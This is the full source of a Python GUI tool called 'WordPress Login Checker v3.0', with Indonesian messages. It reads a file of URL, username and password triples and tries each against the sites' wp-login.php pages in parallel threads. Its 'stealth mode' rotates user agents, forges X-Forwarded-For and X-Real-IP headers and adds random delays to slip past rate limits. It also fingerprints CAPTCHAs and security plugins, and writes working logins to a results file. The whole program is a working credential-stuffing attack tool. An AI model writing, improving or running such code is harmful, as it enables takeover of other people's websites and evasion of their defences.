import sys
import requests
import random
import time
import re
import socket
from concurrent.futures import ThreadPoolExecutor
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QProgressBar, QFileDialog, QMessageBox,
                             QGroupBox, QGridLayout, QComboBox, QTabWidget,
                             QScrollArea, QSizePolicy, QFrame)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QIcon, QPalette, QColor, QPixmap, QIntValidator
from PyQt5 import QtSvg
import os
from urllib.parse import urlparse, urlunparse

# Custom DNS handling
def custom_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT, source_address=None, socket_options=None):
    """Custom connection creation with better DNS handling"""
    host, port = address
    try:
        # Try to resolve hostname with multiple attempts
        for attempt in range(3):
            try:
                ips = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
                if ips:
                    family, type, proto, canonname, sockaddr = ips[0]
                    return socket.create_connection(sockaddr, timeout, source_address)
                time.sleep(0.1)
            except (socket.gaierror, socket.error):
                if attempt == 2:  # Last attempt
                    raise
                time.sleep(0.5)
        raise socket.gaierror(f"Could not resolve {host}")
    except socket.gaierror:
        # Fallback to original behavior
        import urllib3.util.connection
        return urllib3.util.connection.create_connection(address, timeout, source_address, socket_options)

# Patch the connection creation
import urllib3.util.connection
urllib3.util.connection.create_connection = custom_create_connection

class LoginWorker(QThread):
    update_signal = pyqtSignal(str, str)  # message, color
    progress_signal = pyqtSignal(int)
    result_signal = pyqtSignal(str, str, str, bool)  # url, username, password, success
    stats_signal = pyqtSignal(dict)  # statistics data
    
    def __init__(self, file_path, max_threads, delay_min=1, delay_max=3, randomize_delay=True, stealth_mode=True):
        super().__init__()
        self.file_path = file_path
        self.max_threads = max_threads
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.randomize_delay = randomize_delay
        self.stealth_mode = stealth_mode
        self.running = False
        self.request_count = 0
        self.stats = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_logins': 0,
            'connection_errors': 0,
            'dns_errors': 0,
            'captcha_detected': 0,
            'security_plugins': {},
            'response_times': [],
            'start_time': time.time()
        }
        
    def run(self):
        self.running = True
        processed_urls = set()
        total_lines = 0
        processed_count = 0
        
        try:
            with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as file:
                lines = file.readlines()
                total_lines = len(lines)
                
            def process_line(line):
                if not self.running:
                    return
                    
                # Apply randomized delay
                if self.randomize_delay and self.request_count > 0:
                    delay = random.uniform(self.delay_min, self.delay_max)
                    time.sleep(delay)
                
                raw_line = line.strip()
                if not raw_line or raw_line in processed_urls:
                    return
                processed_urls.add(raw_line)
                
                try:
                    # Parse the line
                    if "|" in raw_line:
                        url, username, password = raw_line.split("|")
                    elif ":" in raw_line:
                        if raw_line.startswith("http://") or raw_line.startswith("https://"):
                            parts = raw_line.rsplit(":", 2)
                            if len(parts) != 3:
                                self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                                return
                            url, username, password = parts
                        else:
                            parts = raw_line.split(":")
                            if len(parts) != 3:
                                self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                                return
                            url, username, password = parts
                            url = self.normalize_url(url)
                    else:
                        self.update_signal.emit(f"[!] Format tidak valid: {raw_line}", "red")
                        return
                    
                    # Normalize
                    url = url.strip()
                    username = username.strip()
                    password = password.strip()
                    
                    # Check if URL is accessible first
                    accessibility_check = self.check_url_accessibility(url)
                    if not accessibility_check["accessible"]:
                        error_msg = accessibility_check["message"]
                        self.update_signal.emit(f"[!] {error_msg}: {url}", "red")
                        
                        # Update stats based on error type
                        if "DNS" in error_msg:
                            self.stats['dns_errors'] += 1
                        else:
                            self.stats['connection_errors'] += 1
                            
                        self.result_signal.emit(url, username, password, False)
                        return
                    
                    # Check for CAPTCHA before attempting login
                    captcha_check = self.detect_captcha_protection(url)
                    if captcha_check["has_captcha"]:
                        self.update_signal.emit(f"[!] CAPTCHA Protection: {captcha_check['message']} - {url}", "red")
                        self.stats['captcha_detected'] += 1
                        self.result_signal.emit(url, username, password, False)
                        return
                    
                    # Try login
                    self.update_signal.emit(f"[INFO] Mencoba login ke {url} | {username} | {password}", "yellow")
                    
                    start_time = time.time()
                    success, login_message = self.login_to_wordpress(url, username, password)
                    response_time = time.time() - start_time
                    
                    self.stats['response_times'].append(response_time)
                    self.stats['total_attempts'] += 1
                    
                    if success is True:
                        self.update_signal.emit(f"[+] {login_message}", "green")
                        self.stats['successful_logins'] += 1
                        self.result_signal.emit(url, username, password, True)
                    elif success is False:
                        self.update_signal.emit(f"[-] {login_message}", "red")
                        self.stats['failed_logins'] += 1
                        self.result_signal.emit(url, username, password, False)
                    else:
                        self.update_signal.emit(f"[!] {login_message}", "red")
                        if "DNS" in login_message:
                            self.stats['dns_errors'] += 1
                        else:
                            self.stats['connection_errors'] += 1
                        self.result_signal.emit(url, username, password, False)
                        
                    # Update stats
                    self.stats_signal.emit(self.stats)
                        
                except Exception as e:
                    self.update_signal.emit(f"[!] Error processing line: {str(e)}", "red")
                
                nonlocal processed_count
                processed_count += 1
                self.request_count += 1
                progress = int((processed_count / total_lines) * 100)
                self.progress_signal.emit(progress)
            
            # Process lines with thread pool
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                executor.map(process_line, lines)
                
        except Exception as e:
            self.update_signal.emit(f"[!] Error membaca file: {str(e)}", "red")
        
        self.update_signal.emit("[INFO] Proses selesai", "blue")
        self.progress_signal.emit(100)
        
    def stop(self):
        self.running = False
        
    def safe_request(self, method, *args, **kwargs):
        """Safe wrapper around requests with better error handling"""
        try:
            response = method(*args, **kwargs)
            return response, None
        except requests.exceptions.ConnectionError as e:
            if "NameResolutionError" in str(e) or "Temporary failure in name resolution" in str(e):
                return None, f"DNS Resolution Failed: {str(e)}"
            elif "Max retries exceeded" in str(e):
                return None, f"Connection Error: Max retries exceeded"
            else:
                return None, f"Connection Error: {str(e)}"
        except requests.exceptions.Timeout:
            return None, "Request Timeout"
        except Exception as e:
            return None, f"Request Error: {str(e)}"
        
    def normalize_url(self, url):
        """Normalize URL with proper protocol handling"""
        if not url.startswith(('http://', 'https://')):
            # Try HTTPS first
            try:
                https_url = 'https://' + url
                response, error = self.safe_request(requests.head, https_url, timeout=5, allow_redirects=True)
                if error is None and response.status_code < 400:
                    return https_url
            except:
                pass
            
            # Try HTTP if HTTPS failed
            try:
                http_url = 'http://' + url
                response, error = self.safe_request(requests.head, http_url, timeout=5, allow_redirects=True)
                if error is None and response.status_code < 400:
                    return http_url
            except:
                pass
            
            # Default to HTTPS if both fail
            return 'https://' + url
        
        return url
        
    def apply_evasion_techniques(self, session, url):
        """Apply various evasion techniques"""
        if not self.stealth_mode:
            return session
            
        # Randomize user agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Add referer header
        session.headers['Referer'] = url
        
        # Add random headers occasionally
        if random.random() < 0.3:
            session.headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            session.headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return session
    
    def smart_retry(self, func, *args, max_retries=3, **kwargs):
        """Smart retry mechanism with exponential backoff"""
        for attempt in range(max_retries):
            try:
                return func(*args, **kwargs), None
            except requests.exceptions.RequestException as e:
                if attempt == max_retries - 1:
                    return None, f"Request failed after {max_retries} attempts: {str(e)}"
                
                # Exponential backoff
                delay = (2 ** attempt) + random.random()
                time.sleep(delay)
            except Exception as e:
                return None, f"Unexpected error: {str(e)}"
        
        return None, "Unknown error in smart_retry"
        
    def detect_captcha_protection(self, url):
        """Advanced CAPTCHA detection with multiple techniques"""
        try:
            login_url = f"{url}/wp-login.php" if not url.endswith("wp-login.php") else url
            response, error = self.safe_request(requests.get, login_url, timeout=10, allow_redirects=True)
            
            if error:
                return {"has_captcha": False, "message": error}
                
            content = response.text.lower()
            
            # Comprehensive CAPTCHA detection patterns
            captcha_patterns = [
                r'recaptcha', r'grecaptcha', r'google\.com/recaptcha',
                r'hcaptcha', r'cf-challenge', r'cloudflare',
                r'captcha', r'security code', r'verification code',
                r'human verification', r'anti-spam', r'anti bot',
                r'are you human', r'prove you are human', r'not a robot'
            ]
            
            for pattern in captcha_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return {"has_captcha": True, "message": f"Detected {pattern} protection"}
            
            return {"has_captcha": False, "message": "No CAPTCHA detected"}
            
        except Exception as e:
            return {"has_captcha": False, "message": f"Error during CAPTCHA check: {str(e)}"}
    
    def advanced_detection(self, response):
        """Advanced detection for various WordPress configurations"""
        detection_results = {
            'security_plugins': [],
            'firewall_detected': False,
            'login_protection': False,
            'two_factor': False,
            'custom_login': False
        }
        
        content = response.text.lower()
        
        # Deteksi plugin keamanan
        security_plugins = {
            'wordfence': ['wordfence', 'wf-'],
            'sucuri': ['sucuri', 'sucuri_'],
            'ithemes': ['ithemes', 'ithemes-security'],
            'all-in-one-wp-security': ['aiowps', 'all-in-one-wp-security'],
            'bulletproof-security': ['bulletproof-security', 'bps-']
        }
        
        for plugin, patterns in security_plugins.items():
            for pattern in patterns:
                if pattern in content:
                    detection_results['security_plugins'].append(plugin)
                    break
        
        # Update stats
        for plugin in detection_results['security_plugins']:
            if plugin in self.stats['security_plugins']:
                self.stats['security_plugins'][plugin] += 1
            else:
                self.stats['security_plugins'][plugin] = 1
        
        return detection_results
        
    def check_url_accessibility(self, url):
        """Check if URL is accessible and not returning error pages"""
        try:
            # First try to resolve DNS
            try:
                parsed_url = urlparse(url)
                socket.gethostbyname(parsed_url.netloc)
            except socket.gaierror:
                return {"accessible": False, "message": "DNS Resolution Failed - Cannot resolve domain"}
            
            # Then proceed with HTTP request
            response, error = self.safe_request(requests.get, url, timeout=10, allow_redirects=True)
            
            if error:
                return {"accessible": False, "message": error}
            
            if response.status_code == 404:
                return {"accessible": False, "message": "404 Page Not Found"}
            
            if response.status_code >= 400:
                return {"accessible": False, "message": f"HTTP Error {response.status_code}"}
            
            content_lower = response.text.lower()
            
            error_patterns = [
                r"404(\s+not(\s+found)?)?",
                r"page(\s+not(\s+found)?)?",
                r"not(\s+found)",
                r"error(\s+404)?",
                r"file(\s+not(\s+found)?)?",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return {"accessible": False, "message": "Error page detected"}
            
            if "wp-content" not in response.text and "wp-includes" not in response.text:
                login_url = f"{url}/wp-login.php" if not url.endswith("wp-login.php") else url
                try:
                    login_response, error = self.safe_request(requests.get, login_url, timeout=5, allow_redirects=True)
                    if error:
                        return {"accessible": False, "message": error}
                    if login_response.status_code == 404:
                        return {"accessible": False, "message": "WordPress login not found"}
                except:
                    return {"accessible": False, "message": "Cannot access WordPress login"}
            
            return {"accessible": True, "message": "URL accessible"}
            
        except Exception as e:
            return {"accessible": False, "message": f"Unexpected error: {str(e)}"}
        
    def login_to_wordpress(self, url, username, password):
        login_url = f"{url}/wp-login.php" if not url.endswith("wp-login.php") else url
        
        try:
            session = requests.Session()
            
            # Apply evasion techniques if stealth mode is enabled
            if self.stealth_mode:
                session = self.apply_evasion_techniques(session, url)
            
            # First, get the login page to extract hidden fields
            get_response, error = self.smart_retry(session.get, login_url, timeout=10, allow_redirects=True)
            if error:
                return None, error
            
            # Advanced detection
            detection_results = self.advanced_detection(get_response)
            if detection_results['firewall_detected']:
                return False, "Firewall detected - login blocked"
            
            # Prepare login data
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{url}/wp-admin/",
                'testcookie': '1'
            }
            
            # Add hidden fields from the form
            hidden_fields = re.findall(r'<input type="hidden" name="([^"]+)" value="([^"]*)"', get_response.text)
            for name, value in hidden_fields:
                login_data[name] = value
            
            # Submit login form
            response, error = self.smart_retry(session.post, login_url, data=login_data, timeout=10, allow_redirects=True)
            if error:
                return None, error
            
            if response.status_code == 404:
                return False, "404 Page Not Found - Cannot access login page"
            
            if not response.text.strip():
                return False, "Empty response received from server"

            # Check for CAPTCHA in response
            content_lower = response.text.lower()
            if any(pattern in content_lower for pattern in ['captcha', 'recaptcha', 'security code', 'verification']):
                return False, "CAPTCHA required after login attempt"

            # Enhanced successful login indicators
            success_indicators = [
                'dashboard', 'wp-admin', 'admin-ajax.php', 'profile.php',
                'edit-comments.php', 'upload.php', 'post-new.php'
            ]
            
            for indicator in success_indicators:
                if indicator in response.text.lower():
                    return True, f"Login berhasil: {url}|{username}|{password}"

            # Enhanced failed login indicators
            failed_indicators = [
                'wp-login.php', 'invalid login', 'incorrect', 'error', 'failed',
                'lost your password', 'forgot password', 'login again'
            ]
            
            for indicator in failed_indicators:
                if indicator in content_lower:
                    return False, "Login gagal: Kredensial tidak valid"

            return None, "Tidak dapat menentukan status login - respon tidak dikenali"

        except Exception as e:
            return None, f"Error saat mencoba login: {str(e)}"


class ModernButton(QPushButton):
    def __init__(self, text, icon_path=None, color="#6200ea"):
        super().__init__(text)
        self.setFixedHeight(40)
        self.setCursor(Qt.PointingHandCursor)
        
        # Set style
        self.setStyleSheet(f"""
            QPushButton {{
                background-color: {color};
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                padding: 0 16px;
            }}
            QPushButton:hover {{
                background-color: #3700b3;
            }}
            QPushButton:pressed {{
                background-color: #03dac6;
            }}
            QPushButton:disabled {{
                background-color: #cccccc;
                color: #666666;
            }}
        """)
        
        if icon_path and os.path.exists(icon_path):
            self.setIcon(QIcon(icon_path))


class ModernLineEdit(QLineEdit):
    def __init__(self, placeholder=""):
        super().__init__()
        self.setPlaceholderText(placeholder)
        self.setFixedHeight(40)
        self.setStyleSheet("""
            QLineEdit {
                border: 2px solid #cccccc;
                border-radius: 8px;
                padding: 0 12px;
                font-size: 14px;
                background-color: white;
            }
            QLineEdit:focus {
                border-color: #6200ea;
            }
        """)


class ModernProgressBar(QProgressBar):
    def __init__(self):
        super().__init__()
        self.setFixedHeight(20)
        self.setTextVisible(False)
        self.setStyleSheet("""
            QProgressBar {
                border: 2px solid #6200ea;
                border-radius: 8px;
                background-color: white;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #03dac6;
                border-radius: 6px;
            }
        """)


class ScrollableTextEdit(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setLineWrapMode(QTextEdit.WidgetWidth)  # Wrap text to widget width
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.setStyleSheet("""
            QTextEdit {
                border: 2px solid #cccccc;
                border-radius: 8px;
                padding: 8px;
                background-color: white;
                font-family: 'Courier New';
                font-size: 11px;
            }
            QScrollBar:vertical {
                border: none;
                background: #f0f0f0;
                width: 12px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #c0c0c0;
                min-height: 20px;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical:hover {
                background: #a0a0a0;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
            QScrollBar:horizontal {
                border: none;
                background: #f0f0f0;
                height: 12px;
                margin: 0px;
            }
            QScrollBar::handle:horizontal {
                background: #c0c0c0;
                min-width: 20px;
                border-radius: 6px;
            }
            QScrollBar::handle:horizontal:hover {
                background: #a0a0a0;
            }
        """)


class WordPressLoginChecker(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WordPress Login Checker v3.0 - Advanced")
        self.setGeometry(100, 100, 1100, 800)
        self.stats_data = {}
        
        # Set application style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f5f5f7;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 10px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #6200ea;
            }
            QTabWidget::pane {
                border: 1px solid #cccccc;
                border-radius: 4px;
                background: white;
            }
            QTabBar::tab {
                background: #e0e0e0;
                border: 1px solid #cccccc;
                padding: 8px 12px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #6200ea;
                color: white;
            }
        """)
        
        self.init_ui()
        self.worker = None
        
        # Setup stats update timer
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.update_stats_display)
        self.stats_timer.start(1000)  # Update every second
        
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(20, 20, 20, 20)
        
        # Create tab widget
        self.tabs = QTabWidget()
        
        # Main tab
        self.main_tab = QWidget()
        self.setup_main_tab()
        self.tabs.addTab(self.main_tab, "🛠️ Main")
        
        # Dashboard tab
        self.dashboard_tab = QWidget()
        self.setup_dashboard_tab()
        self.tabs.addTab(self.dashboard_tab, "📊 Dashboard")
        
        # Settings tab
        self.settings_tab = QWidget()
        self.setup_settings_tab()
        self.tabs.addTab(self.settings_tab, "⚙️ Settings")
        
        main_layout.addWidget(self.tabs)
        
        # Status bar
        self.status_bar = QLabel("✅ Ready - Pilih file dan klik Start Checking")
        self.status_bar.setStyleSheet("""
            QLabel {
                color: #666666;
                padding: 8px;
                border-top: 2px solid #cccccc;
                background-color: #f0f0f0;
                border-radius: 4px;
            }
        """)
        main_layout.addWidget(self.status_bar)
        
    def setup_main_tab(self):
        layout = QVBoxLayout(self.main_tab)
        layout.setSpacing(15)
        
        # Header
        header = QLabel("WordPress Login Checker v3.0 - Advanced")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("""
            QLabel {
                color: #6200ea;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #6200ea, stop:1 #03dac6);
                color: white;
                border-radius: 8px;
            }
        """)
        layout.addWidget(header)
        
        # File selection group
        file_group = QGroupBox("📁 File Configuration")
        file_layout = QGridLayout()
        
        self.file_path_edit = ModernLineEdit("Pilih file txt yang berisi kredensial...")
        self.browse_btn = ModernButton("📂 Browse", color="#03dac6")
        self.browse_btn.clicked.connect(self.browse_file)
        
        file_layout.addWidget(QLabel("File Path:"), 0, 0)
        file_layout.addWidget(self.file_path_edit, 0, 1)
        file_layout.addWidget(self.browse_btn, 0, 2)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Progress bar
        self.progress_bar = ModernProgressBar()
        layout.addWidget(self.progress_bar)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.start_btn = ModernButton("🚀 Start Checking", color="#4caf50")
        self.start_btn.clicked.connect(self.start_checking)
        
        self.stop_btn = ModernButton("⏹️ Stop", color="#f44336")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        
        self.save_btn = ModernButton("💾 Save Results", color="#ff9800")
        self.save_btn.clicked.connect(self.save_results)
        
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        button_layout.addWidget(self.save_btn)
        
        layout.addLayout(button_layout)
        
        # Results group with fixed size
        results_group = QGroupBox("📋 Results & Logs")
        results_layout = QVBoxLayout()
        
        # Create fixed size container for text area
        container = QWidget()
        container.setFixedHeight(400)  # Fixed height for results area
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        
        self.results_text = ScrollableTextEdit()
        container_layout.addWidget(self.results_text)
        
        results_layout.addWidget(container)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
    def setup_dashboard_tab(self):
        layout = QVBoxLayout(self.dashboard_tab)
        layout.setSpacing(15)
        
        # Stats header
        stats_header = QLabel("📈 Real-time Statistics")
        stats_header.setStyleSheet("font-size: 18px; font-weight: bold; color: #6200ea;")
        layout.addWidget(stats_header)
        
        # Stats grid
        stats_grid = QGridLayout()
        
        # Create stats labels
        self.stats_labels = {}
        stats_info = [
            ("Total Attempts", "total_attempts", "0"),
            ("Successful Logins", "successful_logins", "0"),
            ("Failed Logins", "failed_logins", "0"),
            ("Connection Errors", "connection_errors", "0"),
            ("DNS Errors", "dns_errors", "0"),
            ("CAPTCHA Detected", "captcha_detected", "0"),
            ("Success Rate", "success_rate", "0%"),
            ("Avg Response Time", "avg_response_time", "0.0s"),
            ("Elapsed Time", "elapsed_time", "0s")
        ]
        
        for i, (label_text, stat_key, default_value) in enumerate(stats_info):
            label = QLabel(label_text)
            value = QLabel(default_value)
            value.setObjectName(f"stat_{stat_key}")
            value.setStyleSheet("font-weight: bold; color: #6200ea;")
            stats_grid.addWidget(label, i // 3, (i % 3) * 2)
            stats_grid.addWidget(value, i // 3, (i % 3) * 2 + 1)
            self.stats_labels[stat_key] = value
        
        layout.addLayout(stats_grid)
        
        # Security plugins section
        plugins_header = QLabel("🛡️ Detected Security Plugins")
        plugins_header.setStyleSheet("font-size: 16px; font-weight: bold; margin-top: 15px; color: #6200ea;")
        layout.addWidget(plugins_header)
        
        # Fixed height container for plugins text
        plugins_container = QWidget()
        plugins_container.setFixedHeight(120)
        plugins_container_layout = QVBoxLayout(plugins_container)
        plugins_container_layout.setContentsMargins(0, 0, 0, 0)
        
        self.plugins_text = ScrollableTextEdit()
        self.plugins_text.setFixedHeight(110)
        plugins_container_layout.addWidget(self.plugins_text)
        
        layout.addWidget(plugins_container)
        
        # Add some spacing
        layout.addStretch()
        
    def setup_settings_tab(self):
        layout = QVBoxLayout(self.settings_tab)
        layout.setSpacing(15)
        
        # Settings header
        settings_header = QLabel("⚙️ Advanced Settings")
        settings_header.setStyleSheet("font-size: 18px; font-weight: bold; color: #6200ea;")
        layout.addWidget(settings_header)
        
        # Thread configuration
        thread_group = QGroupBox("⚡ Thread Configuration")
        thread_layout = QGridLayout()
        
        self.thread_count_edit = ModernLineEdit("10")
        self.thread_count_edit.setValidator(QIntValidator(1, 100))
        
        thread_layout.addWidget(QLabel("Thread Count:"), 0, 0)
        thread_layout.addWidget(self.thread_count_edit, 0, 1)
        
        thread_group.setLayout(thread_layout)
        layout.addWidget(thread_group)
        
        # Delay settings
        delay_group = QGroupBox("⏱️ Delay Settings")
        delay_layout = QGridLayout()
        
        self.delay_min_edit = ModernLineEdit("1")
        self.delay_min_edit.setValidator(QIntValidator(0, 60))
        
        self.delay_max_edit = ModernLineEdit("3")
        self.delay_max_edit.setValidator(QIntValidator(0, 60))
        
        self.random_delay_check = QComboBox()
        self.random_delay_check.addItems(["Enabled", "Disabled"])
        
        delay_layout.addWidget(QLabel("Min Delay (s):"), 0, 0)
        delay_layout.addWidget(self.delay_min_edit, 0, 1)
        delay_layout.addWidget(QLabel("Max Delay (s):"), 1, 0)
        delay_layout.addWidget(self.delay_max_edit, 1, 1)
        delay_layout.addWidget(QLabel("Random Delay:"), 2, 0)
        delay_layout.addWidget(self.random_delay_check, 2, 1)
        
        delay_group.setLayout(delay_layout)
        layout.addWidget(delay_group)
        
        # Stealth settings
        stealth_group = QGroupBox("🕵️ Stealth Mode")
        stealth_layout = QGridLayout()
        
        self.stealth_mode_check = QComboBox()
        self.stealth_mode_check.addItems(["Enabled", "Disabled"])
        
        stealth_layout.addWidget(QLabel("Stealth Mode:"), 0, 0)
        stealth_layout.addWidget(self.stealth_mode_check, 0, 1)
        
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)
        
        # Add some spacing
        layout.addStretch()
        
    def update_stats_display(self):
        if not self.stats_data:
            return
            
        # Update basic stats
        total_attempts = self.stats_data.get('total_attempts', 0)
        successful = self.stats_data.get('successful_logins', 0)
        failed = self.stats_data.get('failed_logins', 0)
        errors = self.stats_data.get('connection_errors', 0)
        dns_errors = self.stats_data.get('dns_errors', 0)
        captcha = self.stats_data.get('captcha_detected', 0)
        
        # Calculate success rate
        success_rate = (successful / total_attempts * 100) if total_attempts > 0 else 0
        
        # Calculate average response time
        response_times = self.stats_data.get('response_times', [])
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Calculate elapsed time
        elapsed_time = time.time() - self.stats_data.get('start_time', time.time())
        
        # Update labels
        self.stats_labels['total_attempts'].setText(str(total_attempts))
        self.stats_labels['successful_logins'].setText(str(successful))
        self.stats_labels['failed_logins'].setText(str(failed))
        self.stats_labels['connection_errors'].setText(str(errors))
        self.stats_labels['dns_errors'].setText(str(dns_errors))
        self.stats_labels['captcha_detected'].setText(str(captcha))
        self.stats_labels['success_rate'].setText(f"{success_rate:.1f}%")
        self.stats_labels['avg_response_time'].setText(f"{avg_response_time:.2f}s")
        self.stats_labels['elapsed_time'].setText(f"{elapsed_time:.0f}s")
        
        # Update security plugins
        plugins = self.stats_data.get('security_plugins', {})
        if plugins:
            plugins_text = "\n".join([f"{plugin}: {count}" for plugin, count in plugins.items()])
            self.plugins_text.setPlainText(plugins_text)
        else:
            self.plugins_text.setPlainText("No security plugins detected yet")
        
    def browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Credentials File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.file_path_edit.setText(file_path)
            
    def start_checking(self):
        file_path = self.file_path_edit.text().strip()
        if not file_path:
            QMessageBox.warning(self, "Warning", "Please select a file first.")
            return
            
        try:
            thread_count = int(self.thread_count_edit.text().strip())
            delay_min = int(self.delay_min_edit.text().strip())
            delay_max = int(self.delay_max_edit.text().strip())
            randomize_delay = self.random_delay_check.currentText() == "Enabled"
            stealth_mode = self.stealth_mode_check.currentText() == "Enabled"
        except ValueError:
            QMessageBox.warning(self, "Warning", "Please enter valid settings.")
            return
            
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.results_text.clear()
        self.plugins_text.clear()
        
        self.worker = LoginWorker(file_path, thread_count, delay_min, delay_max, randomize_delay, stealth_mode)
        self.worker.update_signal.connect(self.update_log)
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.result_signal.connect(self.handle_result)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished.connect(self.on_worker_finished)
        self.worker.start()
        
    def stop_checking(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait()
            
    def on_worker_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.setText("✅ Process completed")
        
    def update_log(self, message, color):
        color_map = {
            "red": "#f44336",
            "green": "#4caf50",
            "yellow": "#ff9800",
            "blue": "#2196f3"
        }
        
        html_color = color_map.get(color, "#000000")
        timestamp = time.strftime("%H:%M:%S")
        
        # Truncate very long messages to prevent horizontal expansion
        max_length = 150
        if len(message) > max_length:
            truncated_msg = message[:max_length] + "..."
        else:
            truncated_msg = message
            
        self.results_text.append(f'<font color="#666666">[{timestamp}]</font> <font color="{html_color}">{truncated_msg}</font>')
        self.status_bar.setText(truncated_msg)
        
        # Auto-scroll to bottom
        scrollbar = self.results_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
        
    def update_progress(self, value):
        self.progress_bar.setValue(value)
        
    def update_stats(self, stats):
        self.stats_data = stats
        
    def handle_result(self, url, username, password, success):
        if success:
            with open('result_new.txt', 'a', encoding='utf-8') as f:
                f.write(f'{url}|{username}|{password}\n')
                
    def save_results(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Results", "results.txt", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.results_text.toPlainText())
                self.update_log(f"💾 Results saved to {file_path}", "green")
            except Exception as e:
                self.update_log(f"❌ Error saving results: {str(e)}", "red")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application font
    font = QFont("Segoe UI", 10)
    app.setFont(font)
    
    window = WordPressLoginChecker()
    window.show()
    
    sys.exit(app.exec_())
